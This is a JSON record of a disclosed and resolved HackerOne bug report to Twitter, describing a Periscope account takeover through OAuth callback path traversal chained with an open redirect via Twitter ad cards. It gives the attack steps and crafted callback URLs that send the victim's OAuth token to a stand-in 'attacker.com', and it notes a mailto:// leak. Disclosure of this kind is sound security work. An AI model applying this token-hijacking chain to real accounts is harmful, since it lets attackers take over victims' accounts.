{"id":110293,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTAyOTM=","url":"https://hackerone.com/reports/110293","title":"Insufficient OAuth callback validation which leads to Periscope account takeover","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-01-12T18:13:53.536Z","submitted_at":"2016-01-12T18:13:53.536Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"filedescriptor","url":"/filedescriptor","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-10T19:49:04.705Z","bug_reporter_agreed_on_going_public_at":"2019-03-18T10:14:50.923Z","team_member_agreed_on_going_public_at":"2019-04-10T19:49:04.636Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\nI would like to report an issue in the Periscope Twitter application which allows attacker to circumvent the callback locking to takeover victim's Periscope account which is connected to a Twitter account.\n\n#Detail\nIn the mobile Periscope app, the *consumer_key* and *consumer_secret* for Twitter application are directly embedded into the app in order to facilitate the OAuth process. The key and secret are protected by obfuscation but it can be recovered by reverse engineering. \n\nFor reference this is the key and secret for Periscope:\n```\nCONSUMER_KEY: █████████\nCONSUMER_SECRET: ███\n```\n\nIn fact, the leakage of the key and secret pair is *not* a major security concern as Twitter provides the \"Callback Locking\" protection to prevent the *callback_url* to be overwritten during the Request Token phase.\n\nPeriscope *does* employ callback locking. However, the locking for Periscope is kind of special compared to normal applications (I guess this is only for Twitter's official applications). In short, it checks whether the protocol for *callback_url* can be used to leak the OAuth token to third parties. For example, ```https://```, ```http://```, ```ftp://``` are forbidden, while ```twittersdk://``` and ```whatever://``` are allowed. The check is sufficient by itself. However, the check is under the assumption that the *callback_url* provided is a complete URI. In addition, it is discovered that it is possible to **use only the path** for *callback_url* and pass the test (e.g. a/../home is valid), and that allows the path to be traversed. Now, if an attacker can find an open redirector on Twitter, he/she can use that as *callback_url* to redirect victim with the OAuth token to attacker's control site.\n\nThe attack flow would look like this:\n\n1. Attacker uses the consumer key \u0026 secret to generate a request token\n2. Victim authorizes the Periscope app for the request token\n3. Victim is redirected to the open redirector with path traversal (e.g. /redirect?url=http://attacker.com#\u0026oauth_token=...)\n4. Victim then lands on attacker controlled site with the token (http://attacker.com#\u0026oauth_token=)\n5. Now the attacker gains the OAuth token from victim. He/she can use it to to exchange for *access_token* and logins victim's Periscope account.\n\n(By the way, the URL fragment in step 3 is a common technique to preserve tokens during HTTP redirect which I really like)\n\nAnd without surprise, such open redirect bug does exist. \nIn the login page (https://twitter.com/login?redirect_after_login=), the *redirect_after_login* parameter can be specified to redirect users if they have logged in. There's a check in place which rejects any URL which is not belong to a Twitter subdomain (i.e. whitelist \\*.twitter.com). However, for Twitter ads one can make a generation card and set the fallback URL to any destination, and the URL for the card happens to be a Twitter subdomain (cards.twitter.com). So after all, attackers can first setup a generation card to redirect to attacker's controlled site, and use the card URL as *redirect_after_login*.\n\nThe redirection flow:\n\n1. callback_url = a/../../login?redirect_after_login=https://cards.twitter.com/card_id\n2. https://cards.twitter.com/card_id\n3. https://attacker.com\n\nBAM BAM BAM\n\nNow, Periscope has enabled \"Login with Twitter\", that means the user will automacially authorize the app for authentication if he/she has done that once before, attacker can abuse that to make the whole attack **stealthy and without user interaction**.\n\n#PoC\n1. Prepare an Periscope account which is connected to a Twitter account, and make sure you have logged in Twitter as that account\n2. Go to https://twitter.com/attackerfoobar/status/686936815945789440\n3. Wait for a moment\n4. Your Periscope account will then be renamed as \"Pwn3d\"\n\nIn this PoC I embedded the payload in a player card to achieve maximum stealthiness, so that whenever the tweet arrives to victim's timeline the attack automatically triggers. You can also check out the standalone PoC here: https://innerht.ml/pocs/periscope-oauth-callback-hijack\n\nVideo demonstration: https://vimeo.com/151530694 (password: xauth)\n\n#Fix\nSince the open redirect bug is more like a feature and may be many of them out there, I would suggest to improve the validation on the callback locking. For example, only allow the *callback_url* to be a complete URL should do the job.","bounty_amount":"5040.0","formatted_bounty":"$5,040","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-04-17T10:14:51.006Z","allow_singular_disclosure_after":-78462591.51211853,"singular_disclosure_allowed":true,"vote_count":256,"voters":["overjt","j4v40n654n","danielmgm","samengmg","jensec","d0xing","bulbu1play3r","kapytein","mashoud1122","corb3nik","and 246 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":759558,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nAlso, as always, good find and excellent writeup! Thank you for helping keep Twitter secure!","automated_response":false,"created_at":"2016-01-15T16:53:45.725Z","updated_at":"2016-01-15T16:53:45.725Z","actor":{"username":"bfd","cleared":false,"url":"/bfd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/639/cb4711f9ee63746ad25d3c68fdef609f4ea84711_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":759768,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.","automated_response":false,"created_at":"2016-01-15T19:08:46.395Z","updated_at":"2016-01-15T19:08:46.395Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Twitter"}},"bounty_amount":"5040.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"filedescriptor","url":"/filedescriptor"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":760347,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks! It's also enjoyable working with you guys :)\nBy the way I found that ```mailto://``` is also allowed. This may be a potential weakness to make the token being sent via mail. This requires user interaction though so probably not a big deal","automated_response":false,"created_at":"2016-01-16T03:56:02.105Z","updated_at":"2016-01-16T04:01:00.835Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1791996,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now (we will address the mailto:// separately). Can you please confirm?\n\nThank you for helping keep Twitter secure!","automated_response":false,"created_at":"2017-06-29T17:49:41.701Z","updated_at":"2017-06-29T17:49:41.701Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"filedescriptor","url":"/filedescriptor"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1792027,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can confirm this is fixed.","automated_response":false,"created_at":"2017-06-29T18:01:04.945Z","updated_at":"2017-06-29T18:01:04.945Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4344546,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-03-18T10:14:50.958Z","updated_at":"2019-03-18T10:14:50.958Z","first_to_agree":true,"actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4532594,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-04-10T19:49:04.655Z","updated_at":"2019-04-10T19:49:04.655Z","actor":{"username":"rajat_tw","cleared":false,"url":"/rajat_tw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4532595,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-04-10T19:49:04.724Z","updated_at":"2019-04-10T19:49:04.724Z","actor":{"username":"rajat_tw","cleared":false,"url":"/rajat_tw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}